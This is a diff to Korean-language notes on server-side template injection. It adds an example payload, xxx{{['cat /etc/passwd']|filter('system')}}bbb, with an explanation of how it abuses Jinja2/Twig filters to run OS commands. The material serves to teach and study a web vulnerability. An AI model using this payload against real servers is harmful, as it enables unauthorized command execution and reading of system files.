@@ -213,9 +213,21 @@ SSTI(Server-Side Template Injection)는 서버 측에서 사용하는 템플릿 
 
 ---
 
-### SSTI 페이로드
+### ⭐ SSTI 페이로드
 
-(1) URL 파라미터(GET)로 주입 — 인코딩/비인코딩 예시
+(1) 
+
+```
+xxx{{['cat /etc/passwd']|filter('system')}}bbb
+```
+
+Jinja2(Flask)나 Twig(PHP) 류의 템플릿 엔진을 공격할 때 자주 쓰이며, 성공하면 서버에서 명령이 실행될 수 있습니다.
+
+* 템플릿 엔진이 **`{{ ... }}`** 내부를 서버에서 해석하도록 유도하고
+* `system` 같은 필터를 통해 OS 명령(`cat /etc/passwd`)을 실행하려는 시도
+
+
+(2) URL 파라미터(GET)로 주입 — 인코딩/비인코딩 예시
 
 * 디코딩된 형태(읽기 쉬운 형식)
 
